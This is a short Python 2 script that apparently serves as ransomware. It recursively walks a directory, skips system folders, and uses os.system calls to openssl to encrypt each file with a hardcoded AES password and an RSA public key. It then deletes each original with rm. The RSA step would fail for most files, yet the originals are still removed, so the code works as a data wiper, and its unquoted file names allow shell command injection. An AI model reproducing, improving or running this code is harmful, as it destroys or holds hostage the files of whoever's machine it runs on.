import os,sys
import getpass

aes_password="ricardo"
unme=getpass.getuser()
keypath="/home/"+unme+"/random/keys"
excluded_dirs=["bin","boot","etc","usr","lib","media","dev","usr","sbin","root"]


def encrypt_(fname):
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
	command=("openssl rsautl -encrypt -pubin -inkey "+keypath+"/public.pem -in "+fname+".aes -out "+fname+".rsa")
	os.system(command)
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
	os.system("rm "+fname+".aes")
	os.system("rm "+fname+".rsa")
	os.system("rm "+fname)


def enc_files(dir_):
	onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
	for f in onlyfiles:
		file=os.path.join(dir_, f)
		print "Encrypting",file,"..."
		encrypt_(file)

def loop(looped_dir):
	#Files in the root dir
	enc_files(looped_dir)
	#Directories inside
	for root,directories,filenames in os.walk(looped_dir):
		for directory in directories:
			dir=os.path.join(root, directory)
			if directory not in excluded_dirs:
				print "Entering",dir,"..."
				enc_files(dir)


loop(sys.argv[1])
